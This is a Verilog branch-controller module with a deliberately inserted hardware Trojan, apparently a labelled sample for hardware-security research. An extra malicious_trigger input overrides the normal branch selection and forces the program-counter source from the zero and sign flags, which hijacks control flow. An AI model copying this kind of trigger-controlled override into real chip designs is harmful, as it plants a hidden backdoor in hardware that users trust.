module Branch_CTLR_Trojan
    (
        input [2:0] branch_in,
        input zero_flag, sign_flag,
        input malicious_trigger, // Added input for the hardware Trojan trigger
        output reg pc_src
    );
    
    wire BEQ, BNQ, BLT, BGT;
    wire malicious_condition; // Added malicious condition wire
    
    always@(branch_in, BEQ, BNQ, BLT, BGT, malicious_trigger, malicious_condition) begin
        if (malicious_trigger) begin
            // When malicious_trigger is high, the Trojan affects the controller's behavior
            pc_src = malicious_condition; // Trojan alters the pc_src based on the malicious condition
        end else begin
            // Normal operations
            case (branch_in)
                3'b001: pc_src = BEQ; // branch equal
                3'b010: pc_src = BNQ; // branch not equal
                3'b011: pc_src = BLT; // branch less than
                3'b100: pc_src = BGT; // branch greater than (rs1 >= rs2)
                3'b101: pc_src = 1'b1; // jump-and-link-register instruction (JALR)
                3'b110: pc_src = 1'b1; // jump and link instruction (JAL)
                default: pc_src = 1'b0;
            endcase
        end
    end
    
    // Trojan's malicious condition based on the taxonomy
    // Example: The malicious condition could force a branch regardless of the actual flags
    assign malicious_condition = (zero_flag | sign_flag); // Example condition
    
    assign BEQ = zero_flag ? 1'b1 : 1'b0;
    assign BNQ = zero_flag ? 1'b0 : 1'b1;
    assign BLT = sign_flag ? 1'b1 : 1'b0;
    assign BGT = sign_flag ? 1'b0 : 1'b1;

endmodule
 
